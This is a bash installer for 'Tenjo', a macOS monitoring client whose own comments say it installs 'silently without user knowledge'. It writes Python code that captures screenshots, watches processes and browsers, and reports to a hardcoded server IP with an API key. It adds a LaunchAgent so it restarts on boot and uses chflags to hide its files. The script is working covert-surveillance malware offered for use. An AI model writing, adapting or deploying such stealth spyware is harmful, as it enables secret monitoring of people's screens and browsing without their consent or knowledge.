#!/bin/bash
# Tenjo Stealth Installer for macOS
# This script installs the monitoring client silently without user knowledge

set -e

# Configuration
APP_NAME="TenjoClient"
INSTALL_DIR="$HOME/.tenjo"
SERVICE_NAME="com.tenjo.monitor"
PLIST_FILE="$HOME/Library/LaunchAgents/$SERVICE_NAME.plist"
PYTHON_VENV="$INSTALL_DIR/.venv"
SERVER_URL="http://103.129.149.67"  # Production server URL
API_KEY="tenjo-api-key-2024"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Logging function
log() {
    echo -e "${GREEN}[$(date '+%Y-%m-%d %H:%M:%S')] $1${NC}"
}

warn() {
    echo -e "${YELLOW}[$(date '+%Y-%m-%d %H:%M:%S')] WARNING: $1${NC}"
}

error() {
    echo -e "${RED}[$(date '+%Y-%m-%d %H:%M:%S')] ERROR: $1${NC}"
    exit 1
}

# Check if running as root
if [[ $EUID -eq 0 ]]; then
   error "This script should not be run as root for stealth installation"
fi

# Function to install Homebrew if not present
install_homebrew() {
    if ! command -v brew &> /dev/null; then
        log "Installing Homebrew (required for Python)..."
        /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)" || error "Failed to install Homebrew"
        
        # Add Homebrew to PATH for current session
        if [[ -f "/opt/homebrew/bin/brew" ]]; then
            eval "$(/opt/homebrew/bin/brew shellenv)"
        elif [[ -f "/usr/local/bin/brew" ]]; then
            eval "$(/usr/local/bin/brew shellenv)"
        fi
    fi
}

# Function to install Python if not present
install_python() {
    if ! command -v python3 &> /dev/null; then
        log "Installing Python 3..."
        brew install python3 || error "Failed to install Python 3"
    fi
}

# Function to create installation directory
create_install_dir() {
    log "Creating installation directory..."
    rm -rf "$INSTALL_DIR" 2>/dev/null || true
    mkdir -p "$INSTALL_DIR"
    mkdir -p "$INSTALL_DIR/src/core"
    mkdir -p "$INSTALL_DIR/src/modules"
    mkdir -p "$INSTALL_DIR/src/utils"
    mkdir -p "$INSTALL_DIR/data/screenshots"
    mkdir -p "$INSTALL_DIR/data/pending"
    mkdir -p "$INSTALL_DIR/logs"
}

# Function to create Python virtual environment
create_venv() {
    log "Creating Python virtual environment..."
    python3 -m venv "$PYTHON_VENV" || error "Failed to create virtual environment"
    source "$PYTHON_VENV/bin/activate"
    
    log "Installing required Python packages..."
    pip install --quiet --upgrade pip
    pip install --quiet mss pillow requests psutil pyobjc-framework-ApplicationServices pyobjc-framework-Quartz
}

# Function to copy application files
copy_app_files() {
    log "Installing application files..."
    
    # Copy main application
    cat > "$INSTALL_DIR/main.py" << 'EOF'
#!/usr/bin/env python3
import sys
import os

# Add src to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'src'))

from core.tenjo_client import TenjoClient

if __name__ == "__main__":
    client = TenjoClient()
    client.start()
EOF

    # Copy source files (we'll need to copy the actual source files here)
    # For now, we'll create minimal versions
    
    # Config
    cat > "$INSTALL_DIR/src/core/config.py" << EOF
import os
import platform
import uuid

class Config:
    # Server configuration
    SERVER_URL = "${SERVER_URL}"
    API_KEY = "${API_KEY}"
    
    # Client identification
    CLIENT_ID = str(uuid.uuid4())
    HOSTNAME = platform.node()
    
    # Paths
    BASE_DIR = os.path.dirname(os.path.dirname(os.path.dirname(__file__)))
    DATA_DIR = os.path.join(BASE_DIR, 'data')
    SCREENSHOTS_DIR = os.path.join(DATA_DIR, 'screenshots')
    PENDING_DIR = os.path.join(DATA_DIR, 'pending')
    LOGS_DIR = os.path.join(BASE_DIR, 'logs')
    
    # Settings
    SCREENSHOT_INTERVAL = 60  # seconds
    HEARTBEAT_INTERVAL = 30   # seconds
    STEALTH_MODE = True
    
    # Create directories
    os.makedirs(SCREENSHOTS_DIR, exist_ok=True)
    os.makedirs(PENDING_DIR, exist_ok=True)
    os.makedirs(LOGS_DIR, exist_ok=True)
EOF

    # Main client file
    cat > "$INSTALL_DIR/src/core/tenjo_client.py" << 'EOF'
import time
import threading
import logging
import os
import sys
import platform
from datetime import datetime

# Add src to path for imports
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))

from core.config import Config
from modules.screen_capture import ScreenCapture
from modules.process_monitor import ProcessMonitor
from modules.browser_monitor import BrowserMonitor
from modules.stream_handler import StreamHandler
from utils.api_client import APIClient
from utils.stealth import StealthManager

class TenjoClient:
    def __init__(self):
        self.setup_logging()
        self.api_client = APIClient(Config.SERVER_URL, Config.API_KEY)
        self.stealth_manager = StealthManager()
        self.client_id = None  # Will be set after registration
        
        # Initialize modules
        self.screen_capture = ScreenCapture(self.api_client)
        self.process_monitor = ProcessMonitor(self.api_client)
        self.browser_monitor = BrowserMonitor(self.api_client)
        self.stream_handler = StreamHandler(self.api_client)
        
        self.running = False
        
    def setup_logging(self):
        log_file = os.path.join(Config.LOGS_DIR, 'tenjo_client.log')
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(log_file),
                logging.StreamHandler()
            ]
        )
        
    def start(self):
        """Start the monitoring client"""
        try:
            logging.info("Starting Tenjo monitoring client...")
            
            # Enable stealth mode
            if Config.STEALTH_MODE:
                self.stealth_manager.enable_stealth_mode()
            
            # Register client with server
            client_info = {
                'client_id': Config.CLIENT_ID,
                'hostname': Config.HOSTNAME,
                'ip_address': 'auto-detect',
                'username': os.getenv('USER', 'unknown'),
                'os_info': {
                    'platform': platform.system(),
                    'version': platform.release(),
                    'architecture': platform.machine(),
                    'python_version': platform.python_version()
                },
                'timezone': 'UTC'
            }
            if not self.api_client.register_client(client_info):
                logging.error("Failed to register with server")
                return
                
            # Store client_id after successful registration
            self.client_id = Config.CLIENT_ID
                
            self.running = True
            
            # Start monitoring threads
            threading.Thread(target=self.heartbeat_loop, daemon=True).start()
            threading.Thread(target=self.screen_capture.start_capture, daemon=True).start()
            threading.Thread(target=self.process_monitor.start_monitoring, daemon=True).start()
            threading.Thread(target=self.browser_monitor.start_monitoring, daemon=True).start()
            threading.Thread(target=self.stream_handler.start_streaming, daemon=True).start()
            
            logging.info("All monitoring modules started successfully")
            
            # Main loop
            while self.running:
                time.sleep(1)
                
        except KeyboardInterrupt:
            logging.info("Shutting down client...")
            self.stop()
        except Exception as e:
            logging.error(f"Fatal error: {e}")
            
    def heartbeat_loop(self):
        """Send periodic heartbeat to server"""
        while self.running:
            try:
                self.api_client.send_heartbeat(self.client_id)
                time.sleep(Config.HEARTBEAT_INTERVAL)
            except Exception as e:
                logging.error(f"Heartbeat error: {e}")
                time.sleep(10)
                
    def stop(self):
        """Stop the monitoring client"""
        self.running = False
        logging.info("Tenjo client stopped")
EOF

    log "Copying source files from development directory..."
    
    # Copy actual source files
    if [ -f "src/modules/screen_capture.py" ]; then
        cp src/modules/screen_capture.py "$INSTALL_DIR/src/modules/"
        cp src/modules/process_monitor.py "$INSTALL_DIR/src/modules/"
        cp src/modules/browser_monitor.py "$INSTALL_DIR/src/modules/"
        cp src/modules/stream_handler.py "$INSTALL_DIR/src/modules/"
        cp src/utils/api_client.py "$INSTALL_DIR/src/utils/"
        cp src/utils/stealth.py "$INSTALL_DIR/src/utils/"
        
        # Create __init__.py files
        touch "$INSTALL_DIR/src/__init__.py"
        touch "$INSTALL_DIR/src/modules/__init__.py"
        touch "$INSTALL_DIR/src/utils/__init__.py"
        touch "$INSTALL_DIR/src/core/__init__.py"
        
        log "Source files copied successfully"
    else
        error "Source files not found! Please run installer from the client directory with source files."
    fi
}

# Function to create launch agent (auto-start)
create_launch_agent() {
    log "Creating launch agent for auto-start..."
    
    cat > "$PLIST_FILE" << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>$SERVICE_NAME</string>
    <key>ProgramArguments</key>
    <array>
        <string>$PYTHON_VENV/bin/python</string>
        <string>$INSTALL_DIR/main.py</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>$INSTALL_DIR/logs/stdout.log</string>
    <key>StandardErrorPath</key>
    <string>$INSTALL_DIR/logs/stderr.log</string>
    <key>WorkingDirectory</key>
    <string>$INSTALL_DIR</string>
    <key>EnvironmentVariables</key>
    <dict>
        <key>PATH</key>
        <string>/usr/local/bin:/usr/bin:/bin:$PYTHON_VENV/bin</string>
    </dict>
</dict>
</plist>
EOF
    
    # Load the launch agent
    launchctl load "$PLIST_FILE" 2>/dev/null || warn "Failed to load launch agent"
}

# Function to start the service immediately
start_service() {
    log "Starting Tenjo monitoring service..."
    launchctl start "$SERVICE_NAME" 2>/dev/null || warn "Failed to start service"
}

# Function to hide installation
hide_installation() {
    log "Applying stealth configurations..."
    
    # Hide the installation directory
    chflags hidden "$INSTALL_DIR" 2>/dev/null || warn "Could not hide installation directory"
    
    # Hide launch agent file
    chflags hidden "$PLIST_FILE" 2>/dev/null || warn "Could not hide launch agent file"
}

# Main installation process
main() {
    log "Starting Tenjo stealth installation..."
    
    install_homebrew
    install_python
    create_install_dir
    create_venv
    copy_app_files
    create_launch_agent
    start_service
    hide_installation
    
    log "✅ Tenjo monitoring client installed successfully!"
    log "📍 Installation directory: $INSTALL_DIR (hidden)"
    log "🔄 Service will start automatically on boot"
    log "📊 Monitoring data will be sent to: $SERVER_URL"
    
    echo ""
    log "Installation completed. The monitoring service is now running silently."
    log "To uninstall: launchctl unload '$PLIST_FILE' && rm -rf '$INSTALL_DIR' '$PLIST_FILE'"
}

# Run installation
main "$@"
